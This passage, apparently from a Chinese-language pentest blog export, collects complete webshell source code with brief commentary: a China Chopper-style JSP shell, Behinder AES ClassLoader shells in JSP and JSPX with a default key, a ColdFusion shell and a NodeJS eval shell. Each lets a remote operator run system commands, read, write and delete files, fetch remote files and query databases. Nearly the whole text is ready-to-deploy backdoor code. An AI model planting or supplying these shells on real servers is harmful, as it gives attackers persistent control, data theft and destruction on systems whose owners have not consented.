Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;);&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);&#125;r.close();&#125;catch(Exception e)&#123;sb.append(&quot;Result\\t|\\t\\r\\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\\t|\\t\\r\\n&quot;);&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\\t|\\t\\r\\n&quot;);&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;br.close();&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt; 菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以A, B, C, …, M 執行不同Payload，然面再接上一些參數。 下面是冰蝎 : 12345678910&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)) &#123; String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(&quot;u&quot;,k); Cipher c=Cipher.getInstance(&quot;AES&quot;); c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;)); new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125; %&gt; 冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。 JSPX1&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt; CFM123456789101112131415161718192021222324252627&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt; 菜刀形，跟上面的JSP一樣。 NodeJS1234567891011121314151617181920212223242526272829303132var http = require(&#x27;http&#x27;), url = require(&#x27;url&#x27;), exec = require(&#x27;child_process&#x27;).exec;var querystring = require(&#x27;querystring&#x27;);var host = &quot;127.0.0.1&quot;, port = &quot;5555&quot;, thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;http.createServer(function (req, res) &#123; req.addListener(&#x27;end&#x27;, function () &#123; &#125;); //var parsedUrl = url.parse(req.url, true); //var cmd = parsedUrl.query[&#x27;cmd&#x27;]; var string = &#x27;&#x27;; req.addListener(&#x27;data&#x27;, function(chunk)&#123; string += chunk; &#125;); var cmd; req.addListener(&#x27;end&#x27;, function()&#123; var strObj = querystring.parse(string); cmd = strObj.pass; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;); if (cmd) &#123; try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125; &#125; else &#123; res.end(); &#125; &#125;);&#125;).listen(port, host);console.log(&#x27;Server running at &#x27; + thisServerUrl ); NodeJS的木馬在滲透測試中不見得能用上，因為使用條件跟php, asp, aspx這些比較過於苛刻。","categories":[{"name":"Code","slug":"Code","permalink":"http://example.com/categories/Code/"}],"tags":[{"name":"webshell","slug":"webshell","permalink":"http://example.com/tags/webshell/"},{"name":"backdoor","slug":"backdoor","permalink":"http://example.com/tags/backdoor/"},{"name":"pentest","slug":"pentest","permalink":"http://example.com/tags/pentest/"},{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"trojan","slug":"trojan","permalink":"http://example.com/tags/trojan/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://example.com/categories/Code/"}]}]}